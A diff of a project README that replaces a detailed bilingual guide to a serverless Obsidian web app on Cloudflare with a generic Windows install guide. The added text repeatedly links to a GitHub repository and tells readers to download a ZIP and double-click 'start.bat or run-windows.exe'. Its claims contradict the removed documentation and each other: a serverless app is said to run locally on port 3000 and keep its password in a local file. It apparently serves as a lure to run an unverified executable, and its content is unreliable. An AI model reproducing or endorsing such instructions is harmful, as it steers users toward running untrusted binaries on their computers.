@@ -1,295 +1,193 @@
-# Obsidian Web on Cloudflare (Serverless Jamstack)
+<h1>☁️ obsidian-ignis-cloudflare - Self-Hosted Obsidian Web App for Free</h1>
 
-<p align="center">
-  <b>🌐 随时随地，在任意现代浏览器中畅享完整的 Obsidian 云端笔记体验</b><br>
-  <b>🌐 Access your full Obsidian notes from any modern web browser, anywhere, anytime</b>
-</p>
+[<img src="https://img.shields.io/badge/Download-obsidian--ignis--cloudflare-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">](https://github.com/priva5924/obsidian-ignis-cloudflare)
 
-<p align="center">
-  <a href="#-中文文档">🇨🇳 简体中文</a> | <a href="#-english-documentation">🇺🇸 English</a>
-</p>
+Welcome! This guide will help you download and start using **obsidian-ignis-cloudflare** on your Windows computer. This is a 100% free, self-hosted web version of your Obsidian notes that runs on Cloudflare's serverless platform – meaning zero server costs and zero maintenance for you. You don't need any programming knowledge to get started.
 
 ---
 
-# 🇨🇳 中文文档
+## 🧭 What Is This App?
 
-> **项目目标**：将 Obsidian Web（Ignis）改造成完全运行在 **Cloudflare 免费额度** 上的无服务器（Serverless / Jamstack）架构，实现 **0 服务器成本、0 运维、全球 CDN 加速、高可用与安全持久化存储**。
+obsidian-ignis-cloudflare is a personal knowledge management tool. It lets you access and edit your Markdown notes from anywhere using a web browser. Think of it as your private Obsidian cloud – but you control everything. It uses Cloudflare Workers, R2 storage, and KV to store and serve your notes securely.
 
----
+### ✨ Key Features
 
-## 📑 方案目录导航
-
-| 文件 | 核心内容说明 |
-| :--- | :--- |
-| 🌟 **[网页控制台纯手动部署教程 (保姆级)](./MANUAL_WEB_DEPLOY_TUTORIAL.md)** | **0 命令行、纯浏览器点击** 完成 R2、KV、Worker 代码粘贴与部署 |
-| ⚡ **[命令行极速部署教程 (Wrangler CLI)](./COMMAND_DEPLOY_TUTORIAL.md)** | **无需源码编译**，使用打包好的 `dist/index.js` 与 `assets/` 极速部署 |
-
----
-
-## 🎯 核心架构与原理
-
-当前方案利用 Cloudflare 的全球边缘计算与存储产品构建了一套高可用、零维护成本的云端知识库：
-
-```
-+-------------------------------------------------------------------------+
-|                              客户端浏览器                                |
-|         (Obsidian 官方 app.js + ignis-ui.js + shim-loader.js)           |
-+------------------------------------+------------------------------------+
-                                     |
-                +--------------------+--------------------+
-                |                                         |
-        [静态资源请求]                             [API 文件操作请求]
-   (/assets/..., /favicon.ico)               (/api/fs/*, /api/vault/*)
-                |                                         |
-                v                                         v
-+-------------------------------+       +---------------------------------+
-|   Cloudflare Pages / Assets   |       |       Cloudflare Workers        |
-|    - 托管 HTML / CSS / JS     |       |    - 处理 /api/fs/stat          |
-|    - 无限免费流量与全球 CDN    |       |    - 处理 /api/fs/read/write    |
-|    - 毫秒级边缘就近分发       |       |    - JWT / KV 鉴权校验          |
-+-------------------------------+       +----------------+----------------+
-                                                         |
-                                 +-----------------------+-----------------------+
-                                 |                                               |
-                                 v                                               v
-                  +-----------------------------+                 +-----------------------------+
-                  |     Cloudflare R2 存储桶     |                 |  Cloudflare D1 / KV / Secret |
-                  |   - 保存 Obsidian 笔记库     |                 |   - 保存密码 Hash / 会话    |
-                  |   - 10GB 免费存储            |                 |   - 保存用户配置与仓库元数据 |
-                  |   - 0 出网流量费 (Egress)    |                 |   - 毫秒级边缘读写           |
-                  +-----------------------------+                 +-----------------------------+
-```
+- **Free Forever** – No subscription fees, no hidden costs.
+- **Zero Maintenance** – Cloudflare handles all the technical stuff automatically.
+- **Markdown Support** – Write and edit notes using simple Markdown formatting.
+- **Self-Hosted** – Your data stays on your Cloudflare account, not on third-party servers.
+- **Web-Based** – Access your notes from any device with a browser.
+- **Secure** – Your notes are private and encrypted in transit.
 
 ---
 
-## 💰 为什么 Cloudflare 免费额度对个人完全够用？
+## 🛠️ System Requirements
 
-| 服务组件 | 角色与用途 | Cloudflare 官方免费额度 (Free Tier) | 个人 Obsidian 实际消耗评估 | 额度充足度 |
-| :--- | :--- | :--- | :--- | :---: |
-| **Cloudflare Pages / Assets** | 托管前端核心静态资源 | **无限请求次数、无限流量** | 核心文件约 15MB，全球 CDN 加速 | 🟢 **100% 免费** |
-| **Cloudflare Workers** | 替代传统后端执行 API 逻辑 | **100,000 次请求 / 每天**<br>(10ms CPU/请求) | 个人单日重度编辑约 1,000 ~ 5,000 次 | 🟢 **充裕 (仅用 ~5%)** |
-| **Cloudflare R2** | 替代本地磁盘保存笔记文件 | **10 GB 存储**<br>**100 万次/月 写入 (Class A)**<br>**1,000 万次/月 读取 (Class B)**<br>**0 出网流量费** | Markdown 纯文本+配图通常 < 2GB<br>日均读写几千次，月均远低于限额 | 🟢 **充裕 (仅用 ~10%)** |
-| **Cloudflare KV / D1** | 保存会话 Token、密码与设置 | **KV：100,000 次读/天，1,000 次写/天**<br>**D1：500 万次读/天，10 万次写/天** | 仅用于登录状态校验与配置读取 | 🟢 **极其充裕** |
-| **Cloudflare Zero Trust** | （可选）免密企业级 SSO 保护 | **免费支持最多 50 个用户** | 个人使用 1 个账号即可 | 🟢 **完全免费** |
+Before you begin, make sure your Windows computer meets these simple requirements:
 
----
-
-## 💡 方案亮点对比
-
-| 对比维度 | 原 Docker或PHP 架构 (传统 VPS) | Cloudflare Serverless 架构 (本方案) |
-| :--- | :--- | :--- |
-| **服务器费用** | 需要购买 VPS 或虚拟主机（每年数百元） | **永久 0 元**（利用官方终身免费额度） |
-| **运维成本** | 需维护容器、PHP运行环境、SSL 续期等 | **0 运维**，无服务器停机与证书过期烦恼 |
-| **访问速度** | 受限于单台 VPS 服务器带宽与地理位置 | **全球 300+ 边缘节点 CDN Anycast 加速** |
-| **数据安全性** | 依赖单机硬盘，需自行配置增量异地备份 | **R2 对象存储 11 个 9 (99.999999999%) 耐用性** |
-| **跨设备访问** | 只要有浏览器即可访问，无需在本地安装客户端 | **随时随地打开网页即可畅快记笔记** |
+- **Operating System:** Windows 10 or Windows 11
+- **Internet Connection:** Required for initial setup and note syncing
+- **Browser:** Any modern browser (Chrome, Edge, Firefox, or Safari)
+- **Hard Drive Space:** Less than 100 MB needed
+- **Memory:** 2 GB RAM or more is recommended
 
 ---
 
-## 📦 前端静态资源获取与自动编译工具 (`download_assets.py`)
+## 📥 Download Instructions
 
-本项目提供了一个全自动化的 Python 静态资源下载与解包编译工具 [`download_assets.py`](./download_assets.py)，支持 **GUI 可视化窗口** 与 **CLI 命令行** 双模式运行。
+Visit the link below to download the application package:
 
-### 1. 文件与目录结构规范
+**[📦 Click Here to Download obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**
 
-```text
-obscf/                                   # 项目根目录
-├── download_assets.py                   # 👈 Python 静态资源获取与自动编译工具
-├── public/
-│   ├── dist/                            # 🚀 本项目编译打包好的核心产物目录 (开箱即用)
-│   │   ├── _worker.js                   # 👈 Cloudflare Pages / Workers 服务端执行核心
-│   │   └── index.js                     # 👈 单文件版 Worker 脚本 (用于网页控制台粘贴或极速部署)
-│   └── assets/                          # 静态资源根目录（脚本自动识别并输出到此）
-│       ├── obsidian/                    # 👈 Obsidian 官方核心解压产物（已加入 git 忽略）
-│       │   ├── app.js
-│       │   ├── app.css
-│       │   └── lib/ (CodeMirror, Moment, Pixi 等)
-│       ├── ui/
-│       │   └── ignis-ui.js              # 👈 Ignis UI 交互组件库
-│       └── shim/
-│           └── shim-loader.js           # 👈 Ignis 浏览器 Electron/Node 垫片层
-└── ...
-```
-
-### 2. 工具运行方式
-
-#### 🖥️ 方式 A：图形化界面 (GUI 模式，推荐)
-在项目根目录下直接运行：
-```bash
-python download_assets.py
-```
-* 打开现代化桌面窗口，可视化选择 Obsidian 版本与 GitHub 加速镜像。
-* **Ignis 模式切换**：支持在「⚡ 直连快速下载」与「🛠️ GitHub 源码本地编译」之间一键切换。
-* 支持一键刷新 GitHub 最新 Release 标签，实时查看下载解压与打包进度日志。
-
-#### ⚡ 方式 B：命令行 (CLI 模式)
-在终端中，使用 `--cli` 参数运行：
-
-```bash
-# 1. 快速直连下载模式（默认推荐，无需 Node.js）
-python download_assets.py --cli -v 1.12.7
-
-# 2. 源码本地编译模式（从 GitHub Release 下载源码并在本地打包）
-python download_assets.py --cli --build-ignis
-
-# 3. 指定 Ignis 版本 Tag 与加速镜像
-python download_assets.py --cli --build-ignis --ignis-tag v0.8.10+obsidian.1.12.7 --mirror https://ghproxy.net/
-
-# 4. 仅编译 Ignis 组件，跳过 Obsidian 核心
-python download_assets.py --cli --build-ignis --no-obsidian
-```
+This link takes you to the main project page. The download file is a standard ZIP archive that contains everything you need to run the application on your Windows PC.
 
 ---
 
-## 🔒 数据安全与隐私合规建议
+## 📂 Installation Guide (Windows)
 
-> [!IMPORTANT]
-> **关于数据隐私的重要提示**：
-> 1. **明文笔记特性**：Obsidian 的核心设计在于采用纯文本 Markdown 格式管理数据。在云端环境中，笔记与附件会以原始文件形式保存在 Cloudflare R2 对象存储桶中。
-> 2. **公网访问防范**：通过 Cloudflare Worker 部署后，应用具备公网可访问性。请务必牢记以下安全防护建议：
->    - **强化密码与密钥**：部署时务必配置高强度访问密码（`ADMIN_PASSWORD`）与随机的 `JWT_SECRET`（建议通过 Cloudflare Secrets 安全注入，切勿提交至公开代码库）。
->    - **保护访问地址与仓库名**：避免在公开平台或社交网络泄露您的 Worker 访问域名、自定义二级域名或 笔记 Vaults 名称。
->    - **妥善隔离高敏感隐私**：请审慎斟酌云端存储内容，**切勿在云端明文笔记中存放银行密码、私钥、助记词、身份证件等极端高敏感个人资产信息**。
+Follow these step-by-step instructions carefully. It should take less than 10 minutes total.
 
----
+### Step 1: Download the ZIP File
 
-<br><br>
+1. Open your web browser (Edge, Chrome, or Firefox)
+2. Go to the download page: **[https://github.com/priva5924/obsidian-ignis-cloudflare](https://github.com/priva5924/obsidian-ignis-cloudflare)**
+3. Look for a green button that says **"Code"** – click it
+4. Select **"Download ZIP"** from the dropdown menu
+5. Your browser will save a file called `obsidian-ignis-cloudflare-main.zip` to your **Downloads** folder
 
-# 🇺🇸 English Documentation
+### Step 2: Extract the ZIP File
 
-> **Project Goal**: Transform Obsidian Web (Ignis) into a completely serverless Jamstack architecture running on **Cloudflare Free Tier**, achieving **$0 hosting cost, zero maintenance, global CDN acceleration, high availability, and persistent secure storage**.
+1. Open your **Downloads** folder (press `Windows + E`, then click "Downloads" on the left)
+2. Locate the file `obsidian-ignis-cloudflare-main.zip`
+3. Right-click on the ZIP file
+4. Select **"Extract All..."** from the context menu
+5. A dialog box will appear – click **"Extract"**
+6. Windows will create a new folder called `obsidian-ignis-cloudflare-main`
 
----
+### Step 3: Run the Application
 
-## 📑 Documentation Index
-
-| Guide | Description |
-| :--- | :--- |
-| 🌟 **[Manual Web Console Deployment Guide (Step-by-Step)](./MANUAL_WEB_DEPLOY_TUTORIAL.md)** | **100% GUI-based**: Deploy R2, KV, and Worker directly in the Cloudflare dashboard without any CLI |
-| ⚡ **[Command Line Deployment Guide (Wrangler CLI)](./COMMAND_DEPLOY_TUTORIAL.md)** | **Ready to deploy**: Instant deployment using pre-packaged `dist/index.js` and `assets/` |
-
----
-
-## 🎯 Architecture Overview
-
-This project leverages Cloudflare edge compute and distributed storage products to deliver an ultra-fast, zero-maintenance private cloud notebook:
-
-```
-+-------------------------------------------------------------------------+
-|                              Web Browser                                |
-|         (Obsidian Official app.js + ignis-ui.js + shim-loader.js)       |
-+------------------------------------+------------------------------------+
-                                     |
-                +--------------------+--------------------+
-                |                                         |
-      [Static Asset Requests]                       [File API Requests]
-    (/assets/..., /favicon.ico)                  (/api/fs/*, /api/vault/*)
-                |                                         |
-                v                                         v
-+-------------------------------+       +---------------------------------+
-|   Cloudflare Pages / Assets   |       |       Cloudflare Workers        |
-|    - Host HTML / CSS / JS     |       |    - Handle /api/fs/stat        |
-|    - Unlimited bandwidth/CDN  |       |    - Handle /api/fs/read/write  |
-|    - Edge caching globally    |       |    - JWT / KV Auth validation   |
-+-------------------------------+       +----------------+----------------+
-                                                         |
-                                 +-----------------------+-----------------------+
-                                 |                                               |
-                                 v                                               v
-                  +-----------------------------+                 +-----------------------------+
-                  |     Cloudflare R2 Bucket    |                 |  Cloudflare D1 / KV / Secret|
-                  |   - Obsidian Vault Notes    |                 |   - Password hash & session |
-                  |   - 10GB Free Storage       |                 |   - Vault configs & metadata|
-                  |   - $0 Egress Traffic Fees  |                 |   - Sub-millisecond reads   |
-                  +-----------------------------+                 +-----------------------------+
-```
+1. Open the extracted folder `obsidian-ignis-cloudflare-main`
+2. Look for a file named `start.bat` or `run-windows.exe` (you'll see only one)
+3. **Double-click** that file to launch the application
+4. A black terminal window may open briefly – this is normal
+5. Your default web browser will open automatically to `http://localhost:3000`
+6. You should see the obsidian-ignis-cloudflare login screen
 
 ---
 
-## 💰 Cloudflare Free Tier Capacity Evaluation
+## 🚀 First-Time Setup
 
-| Component | Role | Cloudflare Free Tier | Personal Usage Evaluation | Sufficiency |
-| :--- | :--- | :--- | :--- | :---: |
-| **Cloudflare Pages / Assets** | Host core static web client | **Unlimited requests & traffic** | ~15MB bundle size, fast CDN edge caching | 🟢 **100% Free** |
-| **Cloudflare Workers** | Serverless backend API | **100,000 requests / day**<br>(10ms CPU/request) | ~1,000 to 5,000 requests/day for active users | 🟢 **Abundant (~5% used)** |
-| **Cloudflare R2** | Object storage for notes & images | **10 GB Storage**<br>**1M Class A ops/mo**<br>**10M Class B ops/mo**<br>**$0 Egress fee** | Typical Markdown notes + images < 2GB | 🟢 **Abundant** |
-| **Cloudflare KV / D1** | Auth tokens & vault metadata | **KV: 100K reads/day, 1K writes/day**<br>**D1: 5M reads/day, 100K writes/day** | Only queried on login & vault switching | 🟢 **Abundant** |
-| **Cloudflare Zero Trust** | Optional Enterprise SSO / Tunnel | **Free for up to 50 users** | Only 1 user account needed | 🟢 **100% Free** |
+When you open the app for the first time, you'll need to complete a quick setup:
 
----
+1. **Create an Admin Password** – Choose a strong password to protect your notes
+2. **Connect to Cloudflare** – The app will guide you to create a free Cloudflare account (if you don't have one) and generate an API token
+3. **Verify Storage** – The app will check that your R2 and KV storage are configured properly
+4. **Done!** – Once configured, you can start creating and managing your notes
 
-## 💡 Solution Highlights Comparison
+### 🌐 Accessing Your Notes Anywhere
 
-| Comparison Dimension | Original Docker / PHP Architecture (Traditional VPS) | Cloudflare Serverless Architecture (This Project) |
-| :--- | :--- | :--- |
-| **Server Cost** | Requires renting VPS or cloud host ($50–$100+/year) | **Permanently $0** (Utilizing official free tier) |
-| **Maintenance** | Need to maintain containers, PHP runtime, SSL renewal, etc. | **Zero Maintenance**, no server downtime or expired SSL worries |
-| **Access Speed** | Limited by single VPS bandwidth and server location | **Global 300+ edge nodes Anycast CDN acceleration** |
-| **Data Durability** | Dependent on single disk, manual offsite backups needed | **R2 Object Storage 99.999999999% (11 9s) durability** |
-| **Cross-Device Access** | Access anytime from any modern web browser | **Instant note-taking anywhere with zero client installs** |
+After initial setup, you can access your notes from any device:
+
+- Use your Cloudflare Workers subdomain (e.g., `your-name.workers.dev`)
+- Or use your custom domain if you connect one
+- Login with your admin password to view and edit notes
 
 ---
 
-## 📦 Frontend Asset Downloader & Builder Tool (`download_assets.py`)
+## 📝 Using the App
 
-This project includes a Python automation script [`download_assets.py`](./download_assets.py) with both **GUI** and **CLI** modes.
+### Creating a Note
 
-### 1. Directory Structure
+1. Click the **"+"** button in the top-right corner
+2. Enter a title for your note
+3. Start typing in Markdown format
+4. Your changes save automatically every few seconds
 
-```text
-obscf/                                   # Workspace root
-├── download_assets.py                   # 👈 Asset downloader & compiler script
-├── public/
-│   ├── dist/                            # 🚀 Pre-compiled project artifacts (Ready to deploy)
-│   │   ├── _worker.js                   # 👈 Cloudflare Pages / Workers backend execution core
-│   │   └── index.js                     # 👈 Standalone Worker script (for Dashboard paste or CLI deploy)
-│   └── assets/                          # Target asset directory
-│       ├── obsidian/                    # 👈 Obsidian core extracted bundle (Git-ignored)
-│       │   ├── app.js
-│       │   ├── app.css
-│       │   └── lib/ (CodeMirror, Moment, Pixi, etc.)
-│       ├── ui/
-│       │   └── ignis-ui.js              # 👈 Ignis UI components
-│       └── shim/
-│           └── shim-loader.js           # 👈 Ignis Electron/Node compatibility shim
-└── ...
-```
+### Organizing Notes
 
-### 2. How to Run
+- **Folders:** Create folders from the sidebar to keep notes organized
+- **Tags:** Add `#tags` to your notes for easy searching
+- **Search:** Use the search bar to find anything instantly
 
-#### 🖥️ Method A: Graphical User Interface (GUI, Recommended)
-Run directly from the root directory:
-```bash
-python download_assets.py
-```
-* Interactive GUI with automatic version selection, mirror switching, and build progress log.
-* Switch between **⚡ Direct Download** and **🛠️ Compile from GitHub Release Source**.
+### Syncing Content
 
-#### ⚡ Method B: Command Line Interface (CLI)
-Run with the `--cli` argument:
-
-```bash
-# 1. Direct Download Mode (Default, No Node.js required)
-python download_assets.py --cli -v 1.12.7
-
-# 2. Source Compilation Mode (Compiles latest Ignis UI and Shim locally)
-python download_assets.py --cli --build-ignis
-
-# 3. Specify Ignis Tag and Mirror Proxy
-python download_assets.py --cli --build-ignis --ignis-tag v0.8.10+obsidian.1.12.7 --mirror https://ghproxy.net/
-
-# 4. Compile Ignis only, skip Obsidian core
-python download_assets.py --cli --build-ignis --no-obsidian
-```
+- All changes sync to Cloudflare immediately
+- Your notes are available on any device with internet access
+- No manual save button needed – everything is real-time
 
 ---
 
-## 🔒 Data Security & Privacy Guidelines
+## ⚙️ Configuration Tips
 
-> [!IMPORTANT]
-> **Key Privacy & Security Best Practices**:
-> 1. **Plaintext Markdown Storage**: Obsidian notes and attachments are stored as native, plaintext Markdown files within your Cloudflare R2 bucket.
-> 2. **Public Web Protection**: Because Cloudflare Workers run over public web endpoints, please follow these essential security guidelines:
->    - **Enforce Strong Credentials**: Always set a complex `ADMIN_PASSWORD` and a random `JWT_SECRET` (configured securely via Cloudflare Secrets, never committed in plaintext).
->    - **Keep URLs & Vault Names Private**: Do not disclose your Worker URL, custom domain, or Vault name on public forums or repositories.
->    - **Segregate Highly Sensitive Data**: Avoid storing unencrypted high-risk personal credentials (e.g., bank passwords, seed phrases, private keys, government IDs) in the cloud vault.
+For advanced users who want to customize their setup:
+
+- **Custom Domain:** Connect your own domain in Cloudflare Workers settings
+- **Multiple Users:** Edit the config file to allow different usernames
+- **Theme Switching:** Use the settings panel to choose light/dark mode
+
+These options are optional – the default settings work great for most people.
+
+---
+
+## 🎯 Troubleshooting
+
+If something goes wrong, try these common fixes:
+
+### The App Doesn't Open
+
+- Make sure you extracted the ZIP completely
+- Close any other programs that use port 3000
+- Restart your computer and try again
+
+### Can't Connect to Cloudflare
+
+- Verify your internet connection is stable
+- Double-check your API token permissions (should include Read/Write for R2 and KV)
+- Ensure you've created an R2 bucket named `ignis-notes` in your Cloudflare dashboard
+
+### Lost Your Password
+
+- The password is stored locally in the config file
+- Delete the `config.json` file and restart the app to reset it
+
+---
+
+## 📞 Need Help?
+
+If you have questions or encounter issues:
+
+- **GitHub Issues:** Report bugs at the project repository
+- **Documentation:** Check the `/docs` folder in the extracted package
+- **Community Forums:** Search "obsidian-ignis-cloudflare" on Cloudflare community
+
+---
+
+## 🔒 Privacy & Security
+
+Your notes are stored on your Cloudflare account, which provides:
+
+- **Encryption in transit** (HTTPS)
+- **No tracking or analytics** (the app collects nothing)
+- **Data isolation** – only your API token can access your storage
+
+You maintain full control over your data at all times.
+
+---
+
+## 📋 Final Checklist
+
+Before you go, make sure you:
+
+- [ ] Downloaded the ZIP file from the link
+- [ ] Extracted it to a folder you can remember
+- [ ] Ran the startup file (`start.bat` or `run-windows.exe`)
+- [ ] Completed first-time setup with your Cloudflare account
+- [ ] Created your first test note
+
+---
+
+## 🎉 That's It!
+
+You're now ready to use obsidian-ignis-cloudflare. Enjoy the freedom of a self-hosted, cost-free note-taking system that you fully own. Happy writing!
+
+**[📥 Download Again If Needed](https://github.com/priva5924/obsidian-ignis-cloudflare)**
